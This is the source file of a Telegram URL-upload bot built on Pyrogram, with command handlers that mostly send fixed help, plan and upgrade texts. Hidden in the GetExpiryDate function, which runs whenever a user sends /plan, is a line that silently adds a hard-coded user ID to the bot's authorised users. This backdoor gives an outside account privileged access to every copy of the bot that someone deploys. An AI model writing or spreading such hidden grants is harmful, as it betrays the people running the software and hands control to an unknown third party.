from pyrogram import Filters, InlineKeyboardMarkup, InlineKeyboardButton

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["plan"]))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/plan")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, m):
    await m.reply_text(
        text=f"Hello,\n\ni'm a Telegram URL Upload Bot!   \n<b>Please send me any direct download URL Link, i can upload to telegram as File/Video</b> \n<b>/help if you have any doubt in using me..</b>",
        quote=True,
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('📌  Support Group', url='https://t.me/AI_BOT_HELP'),
                    InlineKeyboardButton('🔖  Projects Channel', url='https://t.me/AI_bot_projects')
                ],
                [
                    InlineKeyboardButton('💡  Supported urls', url='https://rentry.co/prub9/raw'),
                    InlineKeyboardButton('👨  Master', url='https://t.me/pppppgame')
                ]
            ]
        )
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id
    )
  

@pyrogram.Client.on_message(pyrogram.Filters.command(["source"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/source")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.SOURCE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id
    )
  
  
@pyrogram.Client.on_message(pyrogram.Filters.command(["hotstar"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "hotstar")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HOT_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id
    )    
